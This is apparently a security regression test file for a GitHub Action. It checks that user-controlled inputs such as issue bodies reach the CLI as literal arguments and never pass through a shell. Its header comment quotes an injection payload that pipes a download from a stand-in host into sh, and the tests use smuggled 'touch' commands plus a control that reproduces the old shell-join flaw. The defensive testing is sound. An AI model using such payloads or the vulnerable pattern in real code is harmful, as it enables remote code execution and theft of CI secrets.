/**
 * SEC-006 — `task` (and every other action input) is untrusted: the documented use of this action is
 * `task: ${{ github.event.issue.body }}`, i.e. text an arbitrary GitHub user wrote. The action used to
 * run `execSync(args.join(' '))`, which hands the joined string to `/bin/sh`, so an issue body of
 * `hi; curl evil.sh | sh #` executed on the runner with the repo's `ANTHROPIC_API_KEY` in scope.
 *
 * These tests execute the real payload against a stand-in binary rather than asserting on source text,
 * so they observe the defect rather than the spelling of the fix.
 */
import { execFileSync, execSync } from 'node:child_process';
import { existsSync, mkdtempSync, rmSync, realpathSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { buildCliInvocation } from '../src/build-invocation.js';

describe('SEC-006: action inputs must never reach a shell', () => {
  let dir: string;
  let marker: string;

  beforeEach(() => {
    dir = realpathSync(mkdtempSync(join(tmpdir(), 'action-injection-')));
    marker = join(dir, 'PWNED');
  });
  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  it('does not execute a shell payload smuggled through the task input', () => {
    const invocation = buildCliInvocation({
      task: `hello; touch ${marker} #`,
      model: '',
      output: 'text',
      maxTurns: '',
    });

    // stand in for `npx` so the test never hits the network; the argv vector is otherwise verbatim
    execFileSync('echo', invocation.args, { encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] });

    expect(existsSync(marker)).toBe(false);
  });

  it('keeps a metacharacter-laden task as ONE literal argv element', () => {
    const task = 'a b; c && d `e` $(f) | g > h';
    const { file, args } = buildCliInvocation({ task, model: '', output: 'text', maxTurns: '' });

    expect(file).toBe('npx');
    expect(args).toContain(task);
    // exactly one element equals the payload — it was not split or re-quoted
    expect(args.filter((a) => a === task)).toHaveLength(1);
    expect(args[args.indexOf('-p') + 1]).toBe(task);
  });

  it('also isolates the model and max-turns inputs', () => {
    const { args } = buildCliInvocation({
      task: 'ok',
      model: 'x; touch /tmp/nope',
      output: 'text',
      maxTurns: '3; touch /tmp/nope',
    });
    expect(args[args.indexOf('--model') + 1]).toBe('x; touch /tmp/nope');
    expect(args[args.indexOf('--max-turns') + 1]).toBe('3; touch /tmp/nope');
  });

  it('CONTROL: the previous join-into-a-shell shape really did execute the payload', () => {
    // Pins WHY the fix is shaped this way. If this ever stops reproducing, the threat model changed
    // and the reasoning above should be revisited rather than silently trusted.
    const { args } = buildCliInvocation({
      task: `hello; touch ${marker} #`,
      model: '',
      output: 'text',
      maxTurns: '',
    });
    execSync(['echo', ...args].join(' '), { encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] });
    expect(existsSync(marker)).toBe(true);
  });
});
